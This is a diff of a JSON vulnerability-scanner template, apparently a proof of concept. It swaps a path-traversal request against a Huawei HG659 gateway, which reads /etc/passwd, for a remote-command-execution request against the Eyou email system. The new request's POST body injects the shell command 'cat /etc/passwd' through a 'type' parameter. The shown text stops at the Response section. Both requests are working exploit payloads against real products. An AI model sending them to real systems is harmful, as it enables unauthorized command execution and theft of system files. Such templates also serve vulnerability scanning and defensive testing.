@@ -1,15 +1,17 @@
 {
-    "Name": "华为家庭网关-hg659-fileread",
-    "Description": "华为家庭网关-hg659-fileread",
-    "Product": "快捷通",
+    "Name": "Eyou Email System RCE Vulnerability",
+    "Description": "Eyou Email System RCE Vulnerability",
+    "Product": "Eyou",
     "author": "chumeng",
     "Request":[
-        {
-        "Method": "GET",
-        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
-        "Uri":"/lib///....//....//....//....//....//....//....//....//etc//passwd",
+                {
+        "Method": "POST",
+        "Header": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+            "Content-Type":"application/x-www-form-urlencoded"},
+        "Uri":"/webadm/?q=moni_detail.do&action=gragh",
         "Port":"",
-        "Data":"",
+        "Data":"type='|cat /etc/passwd ||'",
         "Follow_redirects":"false",
         "Upload":{"Name": "","fileName": "","filePath": "" },
         "Response":{
